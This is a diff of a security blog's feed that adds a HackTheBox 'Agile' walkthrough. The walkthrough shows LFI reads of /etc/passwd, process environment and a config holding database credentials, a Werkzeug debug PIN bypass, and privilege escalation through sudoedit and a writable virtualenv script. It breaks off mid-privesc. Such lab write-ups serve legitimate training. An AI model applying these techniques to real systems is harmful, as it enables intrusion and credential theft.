@@ -1,4 +1,484 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-07-31T21:19:03+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Payback - OdysseyCTF</title><link href="https://4g3nt47.github.io/posts/ctf/payback.html" rel="alternate" type="text/html" title="Payback - OdysseyCTF" /><published>2023-07-31T00:00:00+01:00</published><updated>2023-07-31T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/ctf/payback</id><content type="html" xml:base="https://4g3nt47.github.io/posts/ctf/payback.html"><![CDATA[<p><strong>Payback</strong> is a hard-rated box created by <a href="https://github.com/4g3nt47">me</a> for the <a href="https://ctftime.org/event/2029/">OdysseyCTF</a>. It starts with exploiting a <em>NoSQL injection</em> vulnerability in a custom application to bypass registration restrictions, and then a <em>mass assignment</em> vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to <em>LFI</em>, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to <em>SSTI</em>, and can be exploited to access another local user. Priv-esc to root is by exploiting a <em>race condition</em> in a custom binary that uses <em>libcurl</em> to download files (this part was removed in the instance used for the competition).</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2023-08-05T14:30:33+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A blog for infosec stuff.</subtitle><entry><title type="html">Agile - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/linux/web/medium/werkzeug/werkzeug%20console/lfi/mysql/tunneling/sudoedit/sudo/virtualenv/agile.html" rel="alternate" type="text/html" title="Agile - HackTheBox" /><published>2023-08-05T00:00:00+01:00</published><updated>2023-08-05T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/linux/web/medium/werkzeug/werkzeug%20console/lfi/mysql/tunneling/sudoedit/sudo/virtualenv/agile</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/linux/web/medium/werkzeug/werkzeug%20console/lfi/mysql/tunneling/sudoedit/sudo/virtualenv/agile.html"><![CDATA[<p><strong>Agile</strong> is a medium linux box by 0xdf featuring a simple web-based LFI that could be used to bypass PIN validation in the <em>Werkzeug</em> debug console. Once on the box, you’ll recover some creds from a MySQL database and gain access to a local user account. You’ll then be required to exploit a previously discovered vulnerability but this time using a local symlink to get through a filter, and then exploit <code class="language-plaintext highlighter-rouge">sudoedit</code> and a cron job that uses python’s virtualenv to gain code execution as <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p><br /></p>
+
+<h3 id="about">About</h3>
+<p><br /></p>
+
+<p><img src="/assets/img/Pasted image 20230324102949.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230324103020.png" alt="" /></p>
+
+<hr />
+<p><br /></p>
+
+<h3 id="recon">Recon</h3>
+<p><br /></p>
+
+<h4 id="nmap">NMAP</h4>
+<p><br /></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Wed Mar 15 06:47:26 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.203
+Nmap scan report for agile (10.10.11.203)
+Host is up (0.44s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://superpass.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Mar 15 06:48:32 2023 -- 1 IP address (1 host up) scanned in 66.77 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="web">Web</h4>
+<p><br /></p>
+
+<p>Going to the web page redirected to <code class="language-plaintext highlighter-rouge">superpass.htb</code>, which I then added to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file;</p>
+
+<p><img src="/assets/img/Pasted image 20230324103938.png" alt="" /></p>
+
+<p>There is a <em>getting started</em> link at the bottom of the page, which redirect to a login form;</p>
+
+<p><img src="/assets/img/Pasted image 20230324104049.png" alt="" /></p>
+
+<p>Clicking the <em>register</em> button, I was able to create an account, and login;</p>
+
+<p><img src="/assets/img/Pasted image 20230324104254.png" alt="" /></p>
+
+<p>The application is a custom web-based password manager. Checking <em>burp</em>, the application issued us with a token following login;</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>session=.eJwtjkuKwzAQRK8ieh0GtSRLap8i-yGEltQdG5wPlrMKuftoMauiqOLxPnDVjfsiHebfD5hjBNyld74JnOC8CXcx2_Nm1oc5noZrHaM5lrWb1_j8wOV7OQ3ILn2B-djfMtraYAas2VEkLllTLmhLyMlHL7lZVGIqNgVN0-QImwRfGjYUVinqY_UanNQYAmkNwgOktobJZVsc-ZgjVXLosXkXlDG1zIVIHDvbkFOzqQz967vL_m-T4PsHJgRGWg.ZB1wLQ.O5sxCFDdi0TGl0bQOQvJrPSjISE
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>That looked a bit like a JWT, but the algorithm part is missing. Attempting to base64-decode the payload part of the token failed, likely due to the the <code class="language-plaintext highlighter-rouge">-</code> and <code class="language-plaintext highlighter-rouge">_</code> symbols in the payload. Some encoders replace <code class="language-plaintext highlighter-rouge">+</code> and <code class="language-plaintext highlighter-rouge">/</code> with <code class="language-plaintext highlighter-rouge">-</code> and <code class="language-plaintext highlighter-rouge">_</code>, respectively. After replacing them, the payload decodes to a zlib-compressed data, which decompresses to a JSON object;</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"_flashes"</span><span class="p">:[{</span><span class="nl">" t"</span><span class="p">:[</span><span class="s2">"message"</span><span class="p">,</span><span class="s2">"Please log in to access this page."</span><span class="p">]}],</span><span class="nl">"_fresh"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"_id"</span><span class="p">:</span><span class="s2">"1c82969ab8f78b10b487363e8d01f9a9b074f755291de43bd1d1eafebf36c3f42ec6449fc4ea296f0c45280b2936869c92131d324fa17d8ab99e2a20d1a7d07b"</span><span class="p">,</span><span class="nl">"_user_id"</span><span class="p">:</span><span class="s2">"17"</span><span class="p">}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>So I wrote a simple script that, when given a token payload as an argument, decodes it, and when given a file, reads it as JSON and encode it;</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">zlib</span><span class="p">,</span> <span class="n">base64</span>
+
+<span class="k">def</span> <span class="nf">token_decode</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
+  <span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"-"</span><span class="p">,</span> <span class="s">"+"</span><span class="p">)</span>
+  <span class="n">token</span> <span class="o">=</span> <span class="n">token</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"_"</span><span class="p">,</span> <span class="s">"/"</span><span class="p">)</span>
+  <span class="k">while</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">token</span> <span class="o">+=</span> <span class="s">"="</span>
+  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Base64: </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+  <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+  <span class="n">data</span> <span class="o">=</span> <span class="n">zlib</span><span class="p">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+  <span class="n">wfo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"token_data.json"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
+  <span class="n">wfo</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+  <span class="n">wfo</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] JSON: </span><span class="si">{</span><span class="n">data</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+  <span class="k">return</span> <span class="n">data</span>
+
+<span class="k">def</span> <span class="nf">token_encode</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+  <span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">zlib</span><span class="p">.</span><span class="n">compress</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">())).</span><span class="n">decode</span><span class="p">()</span>
+  <span class="k">while</span> <span class="n">data</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"="</span><span class="p">):</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"+"</span><span class="p">,</span> <span class="s">"-"</span><span class="p">)</span>
+  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="s">"_"</span><span class="p">)</span>
+  <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Token: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+  <span class="k">return</span> <span class="n">data</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+  <span class="n">token</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+  <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">token_encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">token_decode</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Multiple attempts to manipulate the token using this script failed, so I moved on.</p>
+
+<p>The password manager has an option to <em>export</em> passwords in the vault, which generated a CSV file of passwords for download;</p>
+
+<p><img src="/assets/img/Pasted image 20230324105930.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230324110102.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">fn</code> parameter looks interesting. Testing it, it was found to be vulnerable to <em>Local File Inclusion (LFI)</em>;</p>
+
+<p><img src="/assets/img/Pasted image 20230324110256.png" alt="" /></p>
+
+<p>Giving the parameter an invalid file generated a detailed debug message that exposes the web app as a <em>Flask/Werkzeug</em> application. This indicate the server is running in debug mode. Going to the <code class="language-plaintext highlighter-rouge">/console</code> route (the default debug console route for Flask) however gave a <strong>404</strong> message;</p>
+
+<p><img src="/assets/img/Pasted image 20230324110755.png" alt="" /></p>
+
+<p>This is odd since the <strong>404</strong> page returned above differs with the ones returned by the server when requesting an invalid route;</p>
+
+<p><img src="/assets/img/Pasted image 20230324110905.png" alt="" /></p>
+
+<p>Hovering over a line in the debug error output showed a small terminal icon to the right;</p>
+
+<p><img src="/assets/img/Pasted image 20230324111006.png" alt="" /></p>
+
+<p>Clicking it prompted us for a debug pin, which we don’t have;</p>
+
+<p><img src="/assets/img/Pasted image 20230324111020.png" alt="" /></p>
+
+<hr />
+<p><br /></p>
+
+<h3 id="foothold">Foothold</h3>
+<p><br /></p>
+
+<h4 id="enumeration-using-lfi">Enumeration using LFI</h4>
+<p><br /></p>
+
+<p>Taking advantage of the LFI bug, and the debug error output, I was able to extract a lot from the system;</p>
+<ul>
+  <li><strong>4</strong> local users (<code class="language-plaintext highlighter-rouge">/etc/passwd</code>) - <em>corum</em>, <em>runner</em>, <em>edwards</em>, <em>dev_admin</em></li>
+  <li>Hidden subdomain <code class="language-plaintext highlighter-rouge">test.superpass.htb</code> (<code class="language-plaintext highlighter-rouge">/etc/hosts</code>). Can’t access this domain from my box as it keeps redirecting to <code class="language-plaintext highlighter-rouge">superpass.htb</code>.</li>
+  <li>Process command (<code class="language-plaintext highlighter-rouge">/proc/self/cmdline</code>) - <code class="language-plaintext highlighter-rouge">/app/venv/bin/python3/app/venv/bin/gunicorn--bind127.0.0.1:5000--threads=10--timeout600wsgi:app</code></li>
+  <li>Environment vars (<code class="language-plaintext highlighter-rouge">/proc/self/environ</code>) - <code class="language-plaintext highlighter-rouge">LANG=C.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME=/var/wwwLOGNAME=www-dataUSER=www-dataINVOCATION_ID=9c2427940e444f78a89d7d86fde2dc58JOURNAL_STREAM=8:32855SYSTEMD_EXEC_PID=1090CONFIG_PATH=/app/config_prod.json</code>
+    <ul>
+      <li>MySQL creds in <code class="language-plaintext highlighter-rouge">/app/config_prod.json</code> - <code class="language-plaintext highlighter-rouge">superpassuser:dSA6l7q*yIVs$39Ml6ywvgK</code></li>
+    </ul>
+  </li>
+  <li>Application entrypoint:  <code class="language-plaintext highlighter-rouge">/app/app/superpass/app.py</code>
+    <ul>
+      <li>From there traced all different parts of the app, and downloaded them for analysis.</li>
+    </ul>
+  </li>
+</ul>
+
+<p>The code responsible for the export and the LFI was found in <code class="language-plaintext highlighter-rouge">views/vault_views.py</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230324112717.png" alt="" /></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">generate_csv()</code> function is defined in <code class="language-plaintext highlighter-rouge">services/password_service.py</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230324112931.png" alt="" /></p>
+
+<p>I thought of finding a way to access other users password exports if I could figure out how the random string appended to the exported filename is generated. The <code class="language-plaintext highlighter-rouge">get_random()</code> function used is defined in <code class="language-plaintext highlighter-rouge">services/utility_service.py</code>;</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">datetime</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+
+<span class="k">def</span> <span class="nf">get_random</span><span class="p">(</span><span class="n">chars</span><span class="o">=</span><span class="mi">20</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()).</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"SeCReT?!"</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="n">chars</span><span class="p">]</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>It looks pretty solid, so I moved on.</p>
+
+<p><br /></p>
+
+<h4 id="werkzeug-debug-console-pin">Werkzeug Debug Console PIN</h4>
+<p><br /></p>
+
+<p>Looking for possible ways to guess the console PIN, I found <a href="https://github.com/wdahlenburg/werkzeug-debug-console-bypass">this guide</a>. The README explains in great detail how to effectively guess the console PIN of a <em>Werkzeug</em> server provided you have an LFI on the host. I was able to get it to work after some tweaks.</p>
+
+<p>The file <code class="language-plaintext highlighter-rouge">werkzeug-pin-bypass.py</code> has two arrays that need to be configured according to the target;</p>
+
+<p><img src="/assets/img/Pasted image 20230324114021.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">probably_public_bits</code>;</p>
+<ul>
+  <li>The username is <code class="language-plaintext highlighter-rouge">www-data</code> in our case.</li>
+  <li>The third item set to <code class="language-plaintext highlighter-rouge">Flask</code> is <code class="language-plaintext highlighter-rouge">wsgi_app</code> in our case. I found this by running the given command <code class="language-plaintext highlighter-rouge">getattr(app, '__name__', getattr(app.__class__, '__name__'))</code> in a local instance of the web app. This seems to be the combination of the entrypoint file used by <code class="language-plaintext highlighter-rouge">gunicorn</code> (<code class="language-plaintext highlighter-rouge">wsgi.py</code>) and the web app entrypoint (<code class="language-plaintext highlighter-rouge">app.py</code>).</li>
+  <li>Full path of Flask library - <code class="language-plaintext highlighter-rouge">/app/venv/lib/python3.10/site-packages/flask/app.py</code></li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">private_bits</code>;</p>
+<ul>
+  <li>Can’t run <code class="language-plaintext highlighter-rouge">uuid.getnode()</code> on the box obviously, and <code class="language-plaintext highlighter-rouge">/sys/class/net/ens33/address</code> does not exist. I read <code class="language-plaintext highlighter-rouge">/proc/self/net/addr</code> to get the interface the service is using, which was found to be <code class="language-plaintext highlighter-rouge">eth0</code>. Then I read <code class="language-plaintext highlighter-rouge">/sys/class/net/eth0/address</code> to get the address, which I converted to int. This value seems to have changed from when I first did the box, so you may need to regenerate.</li>
+  <li>Looking at the other code given for generating machine ID, for this box it will be contents of <code class="language-plaintext highlighter-rouge">/etc/machine-id</code> + <code class="language-plaintext highlighter-rouge">superpass.service</code> (from <code class="language-plaintext highlighter-rouge">/proc/self/cgroup</code>). This turn out to be <code class="language-plaintext highlighter-rouge">ed5b159560f54721827644bc9b220d00superpass.service</code></li>
+</ul>
+
+<p>Plugging all these parameters in, we got a PIN;</p>
+
+<p><img src="/assets/img/Pasted image 20230324120542.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230324120611.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230324120640.png" alt="" /></p>
+
+<p>Running the script gave me a PIN, and it was accepted by the server. I then used the python console to spawn a BASH reverse shell;</p>
+
+<p><img src="/assets/img/Pasted image 20230324120804.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230324121106.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230324121122.png" alt="" /></p>
+
+<hr />
+<p><br /></p>
+
+<h3 id="user">User</h3>
+<p><br /></p>
+
+<p>With a shell on the box as <code class="language-plaintext highlighter-rouge">www-data</code>, I can now connect to the local MySQL server whose creds I got earlier;</p>
+
+<p><img src="/assets/img/Pasted image 20230324121353.png" alt="" /></p>
+
+<p>The password in the <code class="language-plaintext highlighter-rouge">users</code> table are all hashed, but the ones in <code class="language-plaintext highlighter-rouge">passwords</code> table are plain;</p>
+
+<p><img src="/assets/img/Pasted image 20230324121526.png" alt="" /></p>
+
+<p>The creds of <code class="language-plaintext highlighter-rouge">corum</code> are of interest as that’s a valid local user. Testing them, I got access to the local user account of <code class="language-plaintext highlighter-rouge">corum</code> over SSH using the password <code class="language-plaintext highlighter-rouge">5db7caa1d13cc37c9fc2</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230324121718.png" alt="" /></p>
+
+<hr />
+<p><br /></p>
+
+<h3 id="privesc">PrivEsc</h3>
+<p><br /></p>
+
+<p>User has no special groups, nor sudo perms. Checking the <em>nginx</em> config files for the server at <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/</code>, I understood why we couldn’t access <code class="language-plaintext highlighter-rouge">/console</code> directly;</p>
+
+<p><img src="/assets/img/Pasted image 20230324122202.png" alt="" /></p>
+
+<p>The config for the vhost <code class="language-plaintext highlighter-rouge">test.superpass.nginx</code> is defined in <code class="language-plaintext highlighter-rouge">superpass-test.nginx</code>. The service is listening on port <code class="language-plaintext highlighter-rouge">5555</code> locally;</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="err">server</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="err">listen</span><span class="w"> </span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">80</span><span class="err">;</span><span class="w">
+    </span><span class="err">server_name</span><span class="w"> </span><span class="err">test.superpass.htb;</span><span class="w">
+
+    </span><span class="err">location</span><span class="w"> </span><span class="err">/static</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="err">alias</span><span class="w"> </span><span class="err">/app/app-testing/superpass/static;</span><span class="w">
+        </span><span class="err">expires</span><span class="w"> </span><span class="mi">365</span><span class="err">d;</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+    </span><span class="err">location</span><span class="w"> </span><span class="err">/</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="err">include</span><span class="w"> </span><span class="err">uwsgi_params;</span><span class="w">
+        </span><span class="err">proxy_pass</span><span class="w"> </span><span class="err">http://</span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">5555</span><span class="err">;</span><span class="w">
+        </span><span class="err">proxy_set_header</span><span class="w"> </span><span class="err">Host</span><span class="w"> </span><span class="err">$host;</span><span class="w">
+        </span><span class="err">proxy_set_header</span><span class="w"> </span><span class="err">X-Real-IP</span><span class="w"> </span><span class="err">$remote_addr;</span><span class="w">
+        </span><span class="err">proxy_set_header</span><span class="w"> </span><span class="err">X-Forwarded-Protocol</span><span class="w"> </span><span class="err">$scheme;</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Running <code class="language-plaintext highlighter-rouge">ps aux</code> showed the process running as the user <code class="language-plaintext highlighter-rouge">runner</code>;</p>
+
+<p><img src="/assets/img/Pasted image 20230324122624.png" alt="" /></p>
+
+<p>So I setup an SSH tunnel using <code class="language-plaintext highlighter-rouge">-L 5555:test.superpass.htb:5555</code> and edited my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to map <code class="language-plaintext highlighter-rouge">test.superpass.htb</code> to <code class="language-plaintext highlighter-rouge">debian.local</code> (my localhost). It worked, and I can now access the server;</p>
+
+<p><img src="/assets/img/Pasted image 20230324123000.png" alt="" /></p>
+
+<p>This looks very similar to the public facing website. The sources are in <code class="language-plaintext highlighter-rouge">/app/app-testing</code>, and are owned by <code class="language-plaintext highlighter-rouge">runner</code>. The file <code class="language-plaintext highlighter-rouge">/app/config_test.json</code> is interesting, and is readable by <code class="language-plaintext highlighter-rouge">runner</code>, which the server is running as. Testing the LFI bug discovered earlier on the public instance, the local instance seems to be not vulnerable as it simply logs out the user;</p>
+
+<p><img src="/assets/img/Pasted image 20230324123446.png" alt="" /></p>
+
+<p>Checking the source at <code class="language-plaintext highlighter-rouge">/app/app-testing/superpass/views/vault_views.py</code>, I realised why;</p>
+
+<p><img src="/assets/img/Pasted image 20230324123734.png" alt="" /></p>
+
+<p>The application is checking to make sure the requested file’s extension ends with <code class="language-plaintext highlighter-rouge">.csv</code>. This would have complicated things, but since we already have a shell on the box, we could exploit this by creating a <em>symbolic link</em> whose name ends with <code class="language-plaintext highlighter-rouge">.csv</code> and point it to any file we wish.</p>
+
+<p>My first attempt at doing this was to create the symlink in <code class="language-plaintext highlighter-rouge">/tmp</code> (<code class="language-plaintext highlighter-rouge">/var/tmp</code>). It didn’t work. I realized that all symlinks created in this directory by a user cannot be used by another user even if the other user has the required permissions on the destination file of the symlink. More <a href="https://superuser.com/questions/1157004/following-another-users-symlink">on this here</a></p>
+
+<p>Since I am working as the user <code class="language-plaintext highlighter-rouge">corum</code>, I made my home directory readble and executable to <em>others</em> on the box. This is to allow <code class="language-plaintext highlighter-rouge">runner</code> to access files in <em>corum’s</em> home directory. I then created a symlink to the file <code class="language-plaintext highlighter-rouge">/app/config_test.json</code>. It worked, and I got a MySQL cred;</p>
+
+<p><img src="/assets/img/Pasted image 20230324125600.png" alt="" /></p>
+
+<p><img src="/assets/img/Pasted image 20230324125628.png" alt="" /></p>
+
+<p>A credential was found in the database for the user <code class="language-plaintext highlighter-rouge">edwards</code>, and the password <code class="language-plaintext highlighter-rouge">d07867c6267dcb5df0af</code> gave me access to his local account over SSH;</p>
+
+<p><img src="/assets/img/Pasted image 20230324130116.png" alt="" /></p>
+
+<p>The user <code class="language-plaintext highlighter-rouge">edwards</code> has permissions to use <code class="language-plaintext highlighter-rouge">sudoedit</code> to edit a file with privileges of user and group <code class="language-plaintext highlighter-rouge">dev_admin</code>. You can trigger this with the command;</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>sudoedit <span class="nt">-u</span> dev_admin /app/config_test.json
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">sudoedit</code> uses the <code class="language-plaintext highlighter-rouge">$EDITOR</code> environment variable to decide which editor to use when viewing a file. By setting it to <code class="language-plaintext highlighter-rouge">vim &lt;file&gt;</code>, we could use this to read/write to any file that has permissions for user or group <code class="language-plaintext highlighter-rouge">dev_admin</code>.</p>
+
+<p>Further enumeration showed that <code class="language-plaintext highlighter-rouge">/app/test_and_update.sh</code> is run as cron task by root user;</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+
+<span class="c"># update prod with latest from testing constantly assuming tests are passing</span>
+
+<span class="nb">echo</span> <span class="s2">"Starting test_and_update"</span>
+<span class="nb">date</span>
+
+<span class="c"># if already running, exit</span>
+ps auxww | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"grep"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"pytest"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit
+
+echo</span> <span class="s2">"Not already running. Starting..."</span>
+
+<span class="c"># start in dev folder</span>
+<span class="nb">cd</span> /app/app-testing
+
+<span class="c"># system-wide source doesn't seem to happen in cron jobs</span>
+<span class="nb">source</span> /app/venv/bin/activate
+
+<span class="c"># run tests, exit if failure</span>
+pytest <span class="nt">-x</span> 2&gt;&amp;1 <span class="o">&gt;</span>/dev/null <span class="o">||</span> <span class="nb">exit</span>
+
+<span class="c"># tests good, update prod (flask debug mode will load it instantly)</span>
+<span class="nb">cp</span> <span class="nt">-r</span> superpass /app/app/
+<span class="nb">echo</span> <span class="s2">"Complete!"</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The script simply activates a python virtual environment by <em>sourcing</em> <code class="language-plaintext highlighter-rouge">/app/venv/bin/activate</code>, run some tests using <code class="language-plaintext highlighter-rouge">pytest</code>, and copy all the contents of <code class="language-plaintext highlighter-rouge">/app/app-testing/superpass/</code> to <code class="language-plaintext highlighter-rouge">/app/app/</code>. Checking the permissions of the files involved, <code class="language-plaintext highlighter-rouge">/app/venv/bin/activate</code> was found to be <strong>writable</strong> to the group <code class="language-plaintext highlighter-rouge">dev_admin</code>;</p>
